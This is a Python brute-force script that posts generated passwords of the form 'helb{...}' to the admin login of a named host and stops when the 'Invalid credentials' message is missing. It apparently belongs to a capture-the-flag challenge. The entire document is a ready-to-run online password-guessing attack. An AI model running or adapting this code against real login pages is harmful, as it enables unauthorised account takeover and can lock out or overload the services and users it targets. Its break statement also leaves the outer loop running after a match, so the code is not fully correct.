import itertools
import requests
import string

# Set the URL and known parts of the password
url = "http://hlabs.helb-prigogine.be:8812/login"
start = "helb{"
end = "}"
# Define the character set based on your description
charset = string.ascii_letters + string.digits + "_!@#&%"

# Function to attempt a login with a given password
def try_password(password):
    response = requests.post(url, data={'username': 'admin', 'password': password})
    # Adjust according to the site's response for incorrect credentials
    if "Invalid credentials" not in response.text:  # Check for a success message on the page
        print(f"Password found: {password}")
        return True
    return False

# Main brute-force loop
for length in range(1, 30):  # Adjust length range as needed
    for guess in itertools.product(charset, repeat=length):
        password = start + ''.join(guess) + end
        if try_password(password):
            break
